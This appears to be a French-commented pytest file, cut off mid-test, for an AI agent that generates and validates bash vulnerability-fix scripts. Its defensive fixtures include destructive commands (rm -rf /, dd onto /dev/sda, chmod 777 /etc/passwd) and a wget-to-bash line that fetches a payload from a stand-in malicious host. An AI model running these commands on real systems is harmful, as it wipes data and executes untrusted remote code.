"""
Tests unitaires pour le module Generator de l'Agent IA de Cybersécurité

Ce module teste toutes les fonctionnalités du générateur de scripts de correction :
- Génération de scripts bash sécurisés via IA
- Validation automatique des scripts
- Templates prédéfinis pour vulnérabilités courantes
- Génération de scripts de rollback
- Analyse de risque et sécurité
- Gestion des métadonnées et hachage
"""

import asyncio
import json
import os
import pytest
import tempfile
import time
from datetime import datetime
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock, Mock, patch

import sys

sys.path.append(os.path.join(os.path.dirname(__file__), '..'))

from src.core.generator import (
    Generator, ScriptMetadata, ValidationResult, ScriptResult,
    ScriptTemplateManager, quick_script_generation, create_generator,
    validate_bash_syntax, extract_script_commands, estimate_script_risk,
    ScanResultExporter
)
from src.core import GeneratorException, CoreErrorCodes
from config import get_config


class TestScriptMetadata:
    """Tests pour la classe ScriptMetadata"""

    def test_metadata_creation(self):
        """Test de création des métadonnées de script"""
        metadata = ScriptMetadata(
            script_id="test_script_001",
            vulnerability_id="CVE-2024-0001",
            target_system="ubuntu",
            script_type="main",
            generated_at=datetime.utcnow(),
            generated_by="gpt-4",
            risk_level="MEDIUM",
            estimated_duration="5 minutes",
            requires_reboot=False,
            requires_sudo=True
        )

        assert metadata.script_id == "test_script_001"
        assert metadata.vulnerability_id == "CVE-2024-0001"
        assert metadata.target_system == "ubuntu"
        assert metadata.risk_level == "MEDIUM"
        assert metadata.requires_sudo is True
        assert metadata.requires_reboot is False

    def test_metadata_to_dict(self):
        """Test de conversion en dictionnaire"""
        metadata = ScriptMetadata(
            script_id="dict_test_001",
            vulnerability_id="CVE-2024-0002",
            target_system="centos",
            script_type="rollback",
            generated_at=datetime.utcnow(),
            generated_by="gpt-4",
            risk_level="LOW",
            estimated_duration="2 minutes",
            requires_reboot=True,
            requires_sudo=True
        )

        data = metadata.to_dict()

        assert isinstance(data, dict)
        assert data['script_id'] == "dict_test_001"
        assert data['target_system'] == "centos"
        assert data['requires_reboot'] is True
        assert 'generated_at' in data
        assert isinstance(data['generated_at'], str)  # ISO format


class TestValidationResult:
    """Tests pour la classe ValidationResult"""

    def test_validation_result_creation(self):
        """Test de création d'un résultat de validation"""
        validation = ValidationResult(
            is_safe=True,
            overall_risk="LOW",
            execution_recommendation="APPROVE",
            confidence_level=0.95,
            identified_risks=[],
            security_checks={"dangerous_commands": False},
            improvements=["Add more logging"],
            alternative_approach=None
        )

        assert validation.is_safe is True
        assert validation.overall_risk == "LOW"
        assert validation.execution_recommendation == "APPROVE"
        assert validation.confidence_level == 0.95
        assert len(validation.identified_risks) == 0

    def test_validation_result_unsafe(self):
        """Test d'un résultat de validation non sécurisé"""
        risky_validation = ValidationResult(
            is_safe=False,
            overall_risk="CRITICAL",
            execution_recommendation="REJECT",
            confidence_level=0.98,
            identified_risks=[
                {
                    "type": "DANGEROUS_COMMAND",
                    "severity": "CRITICAL",
                    "description": "rm -rf command detected"
                }
            ],
            security_checks={"dangerous_commands": True},
            improvements=["Remove dangerous commands"],
            alternative_approach="Use safer file operations"
        )

        assert risky_validation.is_safe is False
        assert risky_validation.overall_risk == "CRITICAL"
        assert len(risky_validation.identified_risks) == 1
        assert risky_validation.alternative_approach is not None


class TestGenerator:
    """Tests pour la classe Generator principale"""

    def setup_method(self):
        """Setup pour chaque test"""
        self.temp_dir = tempfile.mkdtemp()

        # Configuration de test avec mock OpenAI
        self.test_config = {
            'openai_api_key': 'test_api_key_12345',
            'openai_model': 'gpt-4',
            'openai_max_tokens': 2000,
            'openai_temperature': 0.3
        }

        # Mock de la configuration
        self.config_mock = Mock()
        self.config_mock.openai_api_key = self.test_config['openai_api_key']

    def teardown_method(self):
        """Nettoyage après chaque test"""
        import shutil
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    @patch('src.core.generator.AsyncOpenAI')
    def test_generator_initialization(self, mock_openai):
        """Test de l'initialisation du générateur"""
        generator = Generator(self.test_config)

        assert generator.is_ready is True
        assert generator.config == self.test_config
        assert len(generator.script_templates) > 0
        assert 'apache_update' in generator.script_templates

        # Vérifier que les commandes dangereuses sont chargées
        assert 'destructive' in generator.dangerous_commands
        assert 'rm -rf /' in generator.dangerous_commands['destructive']

    @patch('src.core.generator.AsyncOpenAI')
    def test_generator_without_api_key(self, mock_openai):
        """Test d'initialisation sans clé API"""
        config_no_key = self.test_config.copy()
        config_no_key['openai_api_key'] = None

        with pytest.raises(GeneratorException) as exc_info:
            Generator(config_no_key)

        assert exc_info.value.error_code == CoreErrorCodes.INVALID_CONFIGURATION

    @patch('src.core.generator.AsyncOpenAI')
    def test_find_applicable_template(self, mock_openai):
        """Test de recherche de templates applicables"""
        generator = Generator(self.test_config)

        # Test avec vulnérabilité Apache
        apache_vuln = {
            'name': 'Apache HTTP Server RCE',
            'cve_ids': ['CVE-2024-12345'],
            'affected_service': 'Apache'
        }

        template = generator._find_applicable_template(apache_vuln)
        assert template is not None
        assert 'apache' in template['name'].lower()

        # Test avec vulnérabilité SSL
        ssl_vuln = {
            'name': 'SSL POODLE Vulnerability',
            'cve_ids': ['CVE-2014-3566'],
            'affected_service': 'SSL'
        }

        ssl_template = generator._find_applicable_template(ssl_vuln)
        assert ssl_template is not None
        assert 'ssl' in ssl_template['name'].lower()

        # Test sans template applicable
        unknown_vuln = {
            'name': 'Unknown Vulnerability',
            'cve_ids': ['CVE-2024-9999'],
            'affected_service': 'Unknown'
        }

        no_template = generator._find_applicable_template(unknown_vuln)
        assert no_template is None

    @patch('src.core.generator.AsyncOpenAI')
    def test_customize_template(self, mock_openai):
        """Test de personnalisation de templates"""
        generator = Generator(self.test_config)

        # Template de test
        template = {
            'template': """#!/bin/bash
apt update
apt install -y apache2
systemctl restart apache2
""",
            'name': 'Test Template'
        }

        vuln_details = {
            'name': 'Apache Vulnerability',
            'cve_ids': ['CVE-2024-0001'],
            'affected_service': 'Apache'
        }

        # Test pour Ubuntu (par défaut)
        ubuntu_script = generator._customize_template(template, vuln_details, 'ubuntu')
        assert 'apt update' in ubuntu_script
        assert '#!/bin/bash' in ubuntu_script
        assert 'CVE-2024-0001' in ubuntu_script

        # Test pour CentOS
        centos_script = generator._customize_template(template, vuln_details, 'centos')
        assert 'yum update' in centos_script
        assert 'yum install' in centos_script

    @patch('src.core.generator.AsyncOpenAI')
    async def test_generate_script_with_ai_success(self, mock_openai):
        """Test de génération de script via IA (succès)"""
        # Mock de la réponse OpenAI
        mock_response = Mock()
        mock_choice = Mock()
        mock_message = Mock()

        mock_ai_response = {
            "script_info": {
                "vulnerability_id": "CVE-2024-0001",
                "description": "Script de correction Apache",
                "risk_level": "MEDIUM"
            },
            "main_script": """#!/bin/bash
set -euo pipefail
echo "Correction de la vulnérabilité Apache..."
apt update
apt install -y apache2
systemctl restart apache2
echo "Correction terminée"
"""
        }

        mock_message.content = json.dumps(mock_ai_response)
        mock_choice.message = mock_message
        mock_response.choices = [mock_choice]

        # Configuration du mock
        mock_client = AsyncMock()
        mock_client.chat.completions.create.return_value = mock_response
        mock_openai.return_value = mock_client

        generator = Generator(self.test_config)
        generator.ai_client = mock_client

        vuln_details = {
            'name': 'Apache RCE',
            'severity': 'HIGH',
            'affected_service': 'Apache'
        }

        script_content = await generator._generate_script_with_ai(
            'CVE-2024-0001',
            vuln_details,
            'ubuntu',
            'production',
            'low'
        )

        assert script_content is not None
        assert '#!/bin/bash' in script_content
        assert 'set -euo pipefail' in script_content
        assert 'apache2' in script_content

    @patch('src.core.generator.AsyncOpenAI')
    async def test_generate_script_with_ai_json_error(self, mock_openai):
        """Test de génération avec erreur de parsing JSON"""
        # Mock avec réponse JSON invalide
        mock_response = Mock()
        mock_choice = Mock()
        mock_message = Mock()

        # Réponse avec script bash dans un bloc de code
        mock_message.content = """```bash
#!/bin/bash
echo "Script sans JSON valide"
apt update
```"""

        mock_choice.message = mock_message
        mock_response.choices = [mock_choice]

        mock_client = AsyncMock()
        mock_client.chat.completions.create.return_value = mock_response
        mock_openai.return_value = mock_client

        generator = Generator(self.test_config)
        generator.ai_client = mock_client

        vuln_details = {
            'name': 'Test Vulnerability',
            'severity': 'MEDIUM',
            'affected_service': 'Test'
        }

        script_content = await generator._generate_script_with_ai(
            'TEST-001',
            vuln_details,
            'ubuntu',
            'test',
            'medium'
        )

        assert script_content is not None
        assert '#!/bin/bash' in script_content
        assert 'apt update' in script_content

    @patch('src.core.generator.AsyncOpenAI')
    def test_generate_rollback_script(self, mock_openai):
        """Test de génération de script de rollback"""
        generator = Generator(self.test_config)

        main_script = """#!/bin/bash
set -euo pipefail
apt update
apt install -y apache2
cp /etc/apache2/apache2.conf /etc/apache2/apache2.conf.backup
sed -i 's/ServerTokens OS/ServerTokens Prod/' /etc/apache2/apache2.conf
systemctl restart apache2
"""

        vuln_details = {
            'name': 'Apache Configuration Fix',
            'affected_service': 'Apache'
        }

        rollback_script = asyncio.run(generator._generate_rollback_script(
            main_script, vuln_details, 'ubuntu'
        ))

        assert rollback_script is not None
        assert '#!/bin/bash' in rollback_script
        assert 'rollback' in rollback_script.lower()
        assert 'backup' in rollback_script.lower()

    @patch('src.core.generator.AsyncOpenAI')
    def test_quick_security_validation(self, mock_openai):
        """Test de validation rapide de sécurité"""
        generator = Generator(self.test_config)

        # Script sécurisé
        safe_script = """#!/bin/bash
set -euo pipefail
echo "Script sécurisé"
apt update
apt install -y apache2
systemctl restart apache2
"""

        safe_validation = generator._quick_security_validation(safe_script)
        assert safe_validation['is_safe'] is True
        assert len(safe_validation['risks']) == 0

        # Script dangereux
        dangerous_script = """#!/bin/bash
rm -rf /
dd if=/dev/zero of=/dev/sda
chmod 777 /etc/passwd
"""

        dangerous_validation = generator._quick_security_validation(dangerous_script)
        assert dangerous_validation['is_safe'] is False
        assert len(dangerous_validation['risks']) > 0

        # Vérifier les types de risques détectés
        risk_types = [risk['type'] for risk in dangerous_validation['risks']]
        assert any('DANGEROUS_COMMAND' in risk_type for risk_type in risk_types)

    @patch('src.core.generator.AsyncOpenAI')
    def test_script_analysis_functions(self, mock_openai):
        """Test des fonctions d'analyse de script"""
        generator = Generator(self.test_config)

        test_script = """#!/bin/bash
set -euo pipefail
apt update
apt upgrade -y apache2
cp /etc/apache2/apache2.conf /etc/apache2/apache2.conf.backup
sed -i 's/old/new/' /etc/apache2/apache2.conf
systemctl restart apache2
systemctl restart nginx
"""

        # Test d'analyse des actions
        actions = generator._analyze_script_actions(test_script)
        assert actions['package_updates'] is True
        assert actions['config_changes'] is True
        assert actions['service_restarts'] is True
        assert 'apache2' in actions['services']
        assert 'nginx' in actions['services']

        # Test d'estimation de durée
        duration = generator._estimate_execution_time(test_script)
        assert duration is not None
        assert 'minute' in duration or 'seconde' in duration

        # Test de détection de redémarrage requis
        requires_reboot = generator._requires_reboot(test_script)
        assert requires_reboot is False  # Pas de mots-clés de redémarrage

        # Test de détection sudo requis
        requires_sudo = generator._requires_sudo(test_script)
        assert requires_sudo is True  # apt, systemctl requièrent sudo

    @patch('src.core.generator.AsyncOpenAI')
    async def test_validate_script_basic(self, mock_openai):
        """Test de validation de script (basique)"""
        generator = Generator(self.test_config)

        # Script sécurisé
        safe_script = """#!/bin/bash
set -euo pipefail
echo "Script de test sécurisé"
apt update
apt install -y curl
"""

        vuln_details = {'name': 'Test Vulnerability'}

        # Mock l'appel IA pour échouer (test du fallback)
        mock_client = AsyncMock()
        mock_client.chat.completions.create.side_effect = Exception("API unavailable")
        generator.ai_client = mock_client

        validation = await generator._validate_script(safe_script, 'ubuntu', vuln_details)

        assert isinstance(validation, ValidationResult)
        assert validation.is_safe is True  # Script basique sécurisé
        assert validation.overall_risk in ['LOW', 'MEDIUM']
        assert validation.execution_recommendation in ['APPROVE', 'REVIEW_REQUIRED']

    @patch('src.core.generator.AsyncOpenAI')
    async def test_validate_script_with_ai(self, mock_openai):
        """Test de validation avec réponse IA"""
        # Mock de la réponse IA de validation
        mock_response = Mock()
        mock_choice = Mock()
        mock_message = Mock()

        ai_validation_response = {
            "security_assessment": {
                "overall_risk": "LOW",
                "execution_recommendation": "APPROVE",
                "confidence_level": 90
            },
            "identified_risks": [],
            "security_checks": {
                "dangerous_commands": False,
                "external_downloads": False
            },
            "improvements": ["Add more error checking"],
            "alternative_approach": None
        }

        mock_message.content = json.dumps(ai_validation_response)
        mock_choice.message = mock_message
        mock_response.choices = [mock_choice]

        mock_client = AsyncMock()
        mock_client.chat.completions.create.return_value = mock_response
        mock_openai.return_value = mock_client

        generator = Generator(self.test_config)
        generator.ai_client = mock_client

        safe_script = """#!/bin/bash
set -euo pipefail
apt update
"""

        validation = await generator._validate_script(
            safe_script, 'ubuntu', {'name': 'Test'}
        )

        assert validation.is_safe is True
        assert validation.overall_risk == "LOW"
        assert validation.execution_recommendation == "APPROVE"
        assert validation.confidence_level == 0.9

    @patch('src.core.generator.AsyncOpenAI')
    def test_generate_backup_commands(self, mock_openai):
        """Test de génération de commandes de sauvegarde"""
        generator = Generator(self.test_config)

        # Test pour Apache
        apache_vuln = {
            'name': 'Apache Vulnerability',
            'affected_service': 'Apache'
        }

        apache_backups = generator._generate_backup_commands(apache_vuln, 'ubuntu')
        backup_text = '\n'.join(apache_backups)

        assert '/etc/apache2' in backup_text
        assert 'BACKUP_DIR' in backup_text
        assert 'apache2_config' in backup_text

        # Test pour SSH
        ssh_vuln = {
            'name': 'SSH Vulnerability',
            'affected_service': 'SSH'
        }

        ssh_backups = generator._generate_backup_commands(ssh_vuln, 'ubuntu')
        ssh_backup_text = '\n'.join(ssh_backups)

        assert '/etc/ssh/sshd_config' in ssh_backup_text

        # Test pour service générique
        generic_vuln = {
            'name': 'Generic Vulnerability',
            'affected_service': 'Unknown'
        }

        generic_backups = generator._generate_backup_commands(generic_vuln, 'ubuntu')
        generic_text = '\n'.join(generic_backups)

        assert 'syslog' in generic_text
        assert 'BACKUP_DIR' in generic_text

    @patch('src.core.generator.AsyncOpenAI')
    def test_generate_warnings(self, mock_openai):
        """Test de génération d'avertissements"""
        generator = Generator(self.test_config)

        # Script avec commandes dangereuses
        risky_script = """#!/bin/bash
rm -rf /tmp/test
reboot
iptables -F
"""

        risky_validation = ValidationResult(
            is_safe=False,
            overall_risk="HIGH",
            execution_recommendation="REVIEW_REQUIRED",
            confidence_level=0.8,
            identified_risks=[{"type": "HIGH_RISK"}],
            security_checks={},
            improvements=[]
        )

        warnings = generator._generate_warnings(risky_script, risky_validation)

        assert len(warnings) > 0
        warning_text = ' '.join(warnings)

        assert 'risque' in warning_text.lower() or 'risk' in warning_text.lower()
        assert 'redémarrage' in warning_text.lower() or 'reboot' in warning_text.lower()
        assert 'réseau' in warning_text.lower() or 'network' in warning_text.lower()

    @patch('src.core.generator.AsyncOpenAI')
    async def test_full_script_generation_workflow(self, mock_openai):
        """Test du workflow complet de génération de script"""
        # Configuration complète des mocks

        # Mock pour la génération IA
        generation_response = {
            "script_info": {
                "vulnerability_id": "CVE-2024-0001",
                "description": "Apache security fix",
                "risk_level": "MEDIUM"
            },
            "main_script": """#!/bin/bash
set -euo pipefail
echo "Applying Apache security fix..."
apt update
apt install -y apache2
systemctl restart apache2
echo "Fix applied successfully"
"""
        }

        # Mock pour la validation IA
        validation_response = {
            "security_assessment": {
                "overall_risk": "MEDIUM",
                "execution_recommendation": "APPROVE",
                "confidence_level": 85
            },
            "identified_risks": [],
            "security_checks": {"dangerous_commands": False},
            "improvements": ["Consider adding rollback verification"]
        }

        # Configuration des mocks
        mock_client = AsyncMock()
        mock_client.chat.completions.create.side_effect = [
            self._create_mock_response(generation_response),
            self._create_mock_response(validation_response)
        ]
        mock_openai.return_value = mock_client

        generator = Generator(self.test_config)
        generator.ai_client = mock_client

        # Données de test
        vulnerability_details = {
            'vulnerability_id': 'CVE-2024-0001',
            'name': 'Apache HTTP Server RCE',
            'severity': 'HIGH',
            'affected_service': 'Apache',
            'description': 'Remote code execution vulnerability',
            'cvss_score': 9.8
        }

        # Exécuter la génération complète
        result = await generator.generate_fix_script(
            vulnerability_id='CVE-2024-0001',
            vulnerability_details=vulnerability_details,
            target_system='ubuntu',
            execution_context='production',
            risk_tolerance='low'
        )

        # Vérifications du résultat
        assert isinstance(result, ScriptResult)
        assert result.script_id is not None
        assert result.vulnerability_id == 'CVE-2024-0001'
        assert result.main_script is not None
        assert '#!/bin/bash' in result.main_script
        assert result.rollback_script is not None
        assert isinstance(result.validation_result, ValidationResult)
        assert result.metadata.target_system == 'ubuntu'
        assert len(result.pre_checks) > 0
        assert len(result.post_checks) > 0
        assert result.script_hash is not None
        assert len(result.script_hash) == 16  # Hash tronqué

    def _create_mock_response(self, content_dict):
        """Créer une réponse mock pour OpenAI"""
        mock_response = Mock()
        mock_choice = Mock()
        mock_message = Mock()
        mock_message.content = json.dumps(content_dict)
        mock_choice.message = mock_message
        mock_response.choices = [mock_choice]
        return mock_response

    @patch('src.core.generator.AsyncOpenAI')
    async def test_validate_existing_script(self, mock_openai):
        """Test de validation d'un script existant"""
        mock_client = AsyncMock()
        mock_openai.return_value = mock_client

        generator = Generator(self.test_config)
        generator.ai_client = mock_client

        external_script = """#!/bin/bash
set -euo pipefail
echo "External script test"
apt update
systemctl restart nginx
"""

        # Mock l'appel IA (fallback to basic validation)
        mock_client.chat.completions.create.side_effect = Exception("API Error")

        validation = await generator.validate_existing_script(
            external_script,
            target_system='ubuntu',
            execution_context='test'
        )

        assert isinstance(validation, ValidationResult)
        assert validation.execution_recommendation in ['APPROVE', 'REVIEW_REQUIRED', 'REJECT']

    @patch('src.core.generator.AsyncOpenAI')
    async def test_generate_custom_script(self, mock_openai):
        """Test de génération de script personnalisé"""
        # Mock de la réponse IA
        custom_response = {
            "script_info": {
                "vulnerability_id": "custom_001",
                "description": "Custom hardening script",
                "risk_level": "LOW"
            },
            "main_script": """#!/bin/bash
set -euo pipefail
echo "Executing system hardening..."
ufw enable
sysctl -w net.ipv4.ip_forward=0
echo "Hardening complete"
"""
        }

        mock_client = AsyncMock()
        mock_client.chat.completions.create.side_effect = [
            self._create_mock_response(custom_response),
            self._create_mock_response({
                "security_assessment": {
                    "overall_risk": "LOW",
                    "execution_recommendation": "APPROVE",
                    "confidence_level": 90
                },
                "identified_risks": [],
                "security_checks": {},
                "improvements": []
            })
        ]
        mock_openai.return_value = mock_client

        generator = Generator(self.test_config)
        generator.ai_client = mock_client

        result = await generator.generate_custom_script(
            task_description="Harden the system security configuration",
            target_system="ubuntu",
            risk_tolerance="low"
        )

        assert isinstance(result, ScriptResult)
        assert "hardening" in result.main_script.lower()
        assert result.metadata.risk_level == "LOW"

    @patch('src.core.generator.AsyncOpenAI')
    def test_generator_stats(self, mock_openai):
        """Test des statistiques du générateur"""
        generator = Generator(self.test_config)

        # Statistiques initiales
        initial_stats = generator.get_stats()
        assert initial_stats['total_scripts_generated'] == 0
        assert initial_stats['safe_scripts'] == 0
        assert initial_stats['average_generation_time'] == 0.0

        # Simuler quelques opérations
        generator._update_stats(True, 1.5)  # Script sûr
        generator._update_stats(False, 2.0)  # Script risqué
        generator._update_stats(True, 1.0)  # Script sûr

        updated_stats = generator.get_stats()
        assert updated_stats['total_scripts_generated'] == 3
        assert updated_stats['safe_scripts'] == 2
        assert updated_stats['risky_scripts'] == 1
        assert updated_stats['average_generation_time'] > 0

    @patch('src.core.generator.AsyncOpenAI')
    def test_generator_health_check(self, mock_openai):
        """Test de vérification de santé du générateur"""
        mock_client = AsyncMock()
        mock_openai.return_value = mock_client

        generator = Generator(self.test_config)
        generator.ai_client = mock_client

        assert generator.is_healthy() is True

        # Test avec client non initialisé
        generator.ai_client = None
        assert generator.is_healthy() is False

    @patch('src.core.generator.AsyncOpenAI')
    def test_supported_systems(self, mock_openai):
        """Test des systèmes supportés"""
        generator = Generator(self.test_config)

        supported = generator.get_supported_systems()

        assert isinstance(supported, list)
        assert len(supported) > 0
        assert 'ubuntu' in supported
        assert 'centos' in supported
        assert 'debian' in supported

    @patch('src.core.generator.AsyncOpenAI')
    def test_script_templates(self, mock_openai):
        """Test des templates de scripts"""
        generator = Generator(self.test_config)

        templates = generator.get_script_templates()

        assert isinstance(templates, dict)
        assert len(templates) > 0

        # Vérifier la structure des templates
        for template_name, template_info in templates.items():
            assert 'name' in template_info
            assert 'applicable_cves' in template_info
            assert 'risk_level' in template_info
            assert isinstance(template_info['applicable_cves'], list)


class TestUtilityFunctions:
    """Tests pour les fonctions utilitaires du module generator"""

    @patch('src.core.generator.Generator')
    async def test_quick_script_generation(self, mock_generator_class):
        """Test de génération rapide de script"""
        # Mock du générateur
        mock_generator = Mock()
        mock_result = Mock()
        mock_result.to_dict.return_value = {
            'script_id': 'quick_001',
            'vulnerability_id': 'CVE-2024-0001',
            'main_script': '#!/bin/bash\necho "Test script"',
            'validation_result': {'is_safe': True}
        }

        mock_generator.generate_fix_script = AsyncMock(return_value=mock_result)
        mock_generator_class.return_value = mock_generator

        result = await quick_script_generation(
            vulnerability_id='CVE-2024-0001',
            vulnerability_name='Test Vulnerability',
            target_system='ubuntu'
        )

        assert result['script_id'] == 'quick_001'
        assert result['vulnerability_id'] == 'CVE-2024-0001'
        assert 'main_script' in result

    @patch('src.core.generator.Generator')
    async def test_quick_script_generation_error(self, mock_generator_class):
        """Test de génération rapide avec erreur"""
        mock_generator = Mock()
        mock_generator.generate_fix_script = AsyncMock(
            side_effect=Exception("Generation failed")
        )
        mock_generator_class.return_value = mock_generator

        result = await quick_script_generation(
            vulnerability_id='CVE-2024-ERROR',
            vulnerability_name='Error Vulnerability',
            target_system='ubuntu'
        )

        assert 'error' in result
        assert result['vulnerability_id'] == 'CVE-2024-ERROR'
        assert result['main_script'] == ""

    def test_create_generator(self):
        """Test de la factory create_generator"""
        with patch('src.core.generator.Generator') as mock_generator:
            custom_config = {'custom_setting': 'test_value'}

            create_generator(custom_config)

            mock_generator.assert_called_once_with(custom_config)

    def test_validate_bash_syntax_valid(self):
        """Test de validation de syntaxe bash valide"""
        valid_script = """#!/bin/bash
set -euo pipefail
echo "Hello World"
if [ "$1" = "test" ]; then
    echo "Test mode"
fi
"""

        result = validate_bash_syntax(valid_script)

        assert result['valid'] is True
        assert result['error_message'] is None

    def test_validate_bash_syntax_invalid(self):
        """Test de validation de syntaxe bash invalide"""
        invalid_script = """#!/bin/bash
echo "Unclosed quote
if [ missing bracket
then echo "syntax error"
"""

        result = validate_bash_syntax(invalid_script)

        assert result['valid'] is False
        assert result['error_message'] is not None

    def test_validate_bash_syntax_timeout(self):
        """Test de validation avec timeout simulé"""
        with patch('subprocess.run') as mock_run:
            mock_run.side_effect = subprocess.TimeoutExpired(['bash', '-n'], 10)

            result = validate_bash_syntax("#!/bin/bash\necho test")

            assert result['valid'] is False
            assert 'timeout' in result['error_message'].lower()

    def test_extract_script_commands(self):
        """Test d'extraction et catégorisation des commandes"""
        test_script = """#!/bin/bash
# Installation de packages
apt update
apt install -y apache2 curl

# Gestion des services
systemctl enable apache2
systemctl start apache2
service nginx restart

# Opérations sur fichiers
cp /etc/apache2/apache2.conf /backup/
chmod 644 /etc/apache2/sites-available/default
chown www-data:www-data /var/www/html

# Configuration réseau
iptables -A INPUT -p tcp --dport 80 -j ACCEPT
ufw allow 80/tcp

# Configuration système
crontab -e
sysctl -w net.ipv4.ip_forward=1

# Autres commandes
echo "Configuration terminée"
logger "Apache configured"
"""

        commands = extract_script_commands(test_script)

        assert 'package_management' in commands
        assert 'service_management' in commands
        assert 'file_operations' in commands
        assert 'network_operations' in commands
        assert 'system_operations' in commands
        assert 'other' in commands

        # Vérifier que les commandes sont correctement catégorisées
        assert len(commands['package_management']) >= 2  # apt update, apt install
        assert len(commands['service_management']) >= 3  # systemctl, service
        assert len(commands['file_operations']) >= 3  # cp, chmod, chown
        assert len(commands['network_operations']) >= 2  # iptables, ufw
        assert len(commands['system_operations']) >= 2  # crontab, sysctl

    def test_estimate_script_risk_low(self):
        """Test d'estimation de risque faible"""
        safe_script = """#!/bin/bash
set -euo pipefail
echo "Safe script"
apt update
apt install -y curl
systemctl restart apache2
"""

        risk_assessment = estimate_script_risk(safe_script)

        assert risk_assessment['risk_level'] in ['LOW', 'MEDIUM']
        assert risk_assessment['risk_score'] >= 0
        assert isinstance(risk_assessment['risk_factors'], dict)
        assert isinstance(risk_assessment['recommendations'], list)

    def test_estimate_script_risk_high(self):
        """Test d'estimation de risque élevé"""
        risky_script = """#!/bin/bash
rm -rf /tmp/sensitive_data
dd if=/dev/zero of=/dev/sdb
iptables -F
chmod 777 /etc/passwd
wget http://malicious-site.com/payload.sh | bash
sudo su -
"""

        risk_assessment = estimate_script_risk(risky_script)

        assert risk_assessment['risk_level'] in ['HIGH', 'CRITICAL']
        assert risk_assessment['risk_score'] > 3

        # Vérifier les facteurs de risque détectés
        factors = risk_assessment['risk_factors']
        assert factors['destructive_commands'] > 0
        assert factors['network_changes'] > 0
        assert factors['privilege_operations'] > 0
        assert factors['external_downloads'] > 0

        # Vérifier les recommandations
        recommendations = risk_assessment['recommendations']
        assert len(recommendations) > 0
        rec_text = ' '.join(recommendations).lower()
        assert any(word in rec_text for word in ['destructrice', 'sauvegarde', 'réseau', 'privilège'])


class TestScriptTemplateManager:
    """Tests pour le gestionnaire de templates de scripts"""

    def setup_method(self):
        """Setup pour chaque test"""
        self.temp_dir = tempfile.mkdtemp()
        self.templates_dir = os.path.join(self.temp_dir, "templates")
        os.makedirs(self.templates_dir, exist_ok=True)

    def teardown_method(self):
        """Nettoyage après chaque test"""
        import shutil
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_template_manager_initialization(self):
        """Test d'initialisation du gestionnaire de templates"""
        manager = ScriptTemplateManager(self.templates_dir)

        assert manager.templates_dir == Path(self.templates_dir)
        assert os.path.exists(self.templates_dir)
        assert isinstance(manager.templates, dict)

    def test_template_manager_load_templates(self):
        """Test de chargement des templates depuis fichiers"""
        # Créer un fichier template de test
        test_template = {
            "name": "Test Apache Template",
            "script_content": "#!/bin/bash\napt install -y apache2",
            "applicable_cves": ["CVE-2024-0001"],
            "risk_level": "MEDIUM",
            "description": "Template de test pour Apache"
        }

        template_file = os.path.join(self.templates_dir, "test_apache.json")
        with open(template_file, 'w') as f:
            json.dump(test_template, f)

        # Recharger les templates
        manager = ScriptTemplateManager(self.templates_dir)

        assert 'test_apache' in manager.templates
        assert manager.templates['test_apache']['name'] == "Test Apache Template"

    def test_template_manager_invalid_json(self):
        """Test avec fichier JSON invalide"""
        # Créer un fichier JSON invalide
        invalid_file = os.path.join(self.templates_dir, "invalid.json")
        with open(invalid_file, 'w') as f:
            f.write("{ invalid json content }")

        # Le gestionnaire devrait ignorer les fichiers invalides
        with patch('src.core.generator.logger') as mock_logger:
            manager = ScriptTemplateManager(self.templates_dir)

            assert 'invalid' not in manager.templates
            # Vérifier qu'un warning a été loggé
            mock_logger.warning.assert_called()


class TestScanResultExporter:
    """Tests pour l'exporteur de résultats de scan"""

    def setup_method(self):
        """Setup pour chaque test"""
        # Créer un mock ScanResult pour les tests
        self.mock_scan_result = Mock()
        self.mock_scan_result.target = "192.168.1.100"
        self.mock_scan_result.completed_at = datetime(2024, 1, 15, 10, 30, 45)
        self.mock_scan_result.duration = 120.5
        self.mock_scan_result.host_status = "up"
        self.mock_scan_result.open_ports = [22, 80, 443]
        self.mock_scan_result.services = []

        # Mock vulnerabilities
        mock_vuln = Mock()
        mock_vuln.vulnerability_id = "CVE-2024-0001"
        mock_vuln.name = "Test Vulnerability"
        mock_vuln.severity = "HIGH"
        mock_vuln.cvss_score = 8.5
        mock_vuln.affected_service = "Apache"
        mock_vuln.affected_port = 80
        mock_vuln.cve_ids = ["CVE-2024-0001"]
        mock_vuln.detection_method = "nmap-script"

        self.mock_scan_result.vulnerabilities = [mock_vuln]

        # Mock to_dict method
        self.mock_scan_result.to_dict.return_value = {
            'target': '192.168.1.100',
            'completed_at': '2024-01-15T10:30:45',
            'duration': 120.5,
            'vulnerabilities': [{
                'vulnerability_id': 'CVE-2024-0001',
                'name': 'Test Vulnerability',
                'severity': 'HIGH'
            }]
        }

    def test_export_to_json(self):
        """Test d'export en JSON"""
        json_result = ScanResultExporter.to_json(self.mock_scan_result, indent=2)

        assert isinstance(json_result, str)

        # Parser le JSON pour vérifier sa validité
        parsed = json.loads(json_result)
        assert parsed['target'] == '192.168.1.100'
        assert parsed['duration'] == 120.5
        assert len(parsed['vulnerabilities']) == 1

    def test_export_to_csv(self):
        """Test d'export en CSV"""
        csv_result = ScanResultExporter.to_csv(self.mock_scan_result)

        assert isinstance(csv_result, str)
        assert 'Target,Vulnerability ID,Name,Severity' in csv_result
        assert '192.168.1.100' in csv_result
        assert 'CVE-2024-0001' in csv_result
        assert 'Test Vulnerability' in csv_result
        assert 'HIGH' in csv_result

    def test_export_to_html(self):
        """Test d'export en HTML"""
        html_result = ScanResultExporter.to_html(self.mock_scan_result)

        assert isinstance(html_result, str)
        assert '<!DOCTYPE html>' in html_result
        assert '192.168.1.100' in html_result
        assert 'CVE-2024-0001' in html_result
        assert 'Test Vulnerability' in html_result
        assert 'class="high"' in html_result  # CSS class for severity


class TestIntegrationScenarios:
    """Tests d'intégration pour des scénarios complets"""

    def setup_method(self):
        """Setup pour chaque test"""
        self.temp_dir = tempfile.mkdtemp()

    def teardown_method(self):
        """Nettoyage après chaque test"""
        import shutil
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    @patch('src.core.generator.AsyncOpenAI')
    async def test_end_to_end_apache_vulnerability(self, mock_openai):
        """Test de bout en bout pour une vulnérabilité Apache"""
        # Configuration du mock IA complet
        generation_response = {
            "script_info": {
                "vulnerability_id": "CVE-2024-12345",
                "description": "Fix Apache HTTP Server RCE",
                "estimated_duration": "5 minutes",
                "requires_reboot": False,
                "risk_level": "MEDIUM"
            },
            "pre_checks": [
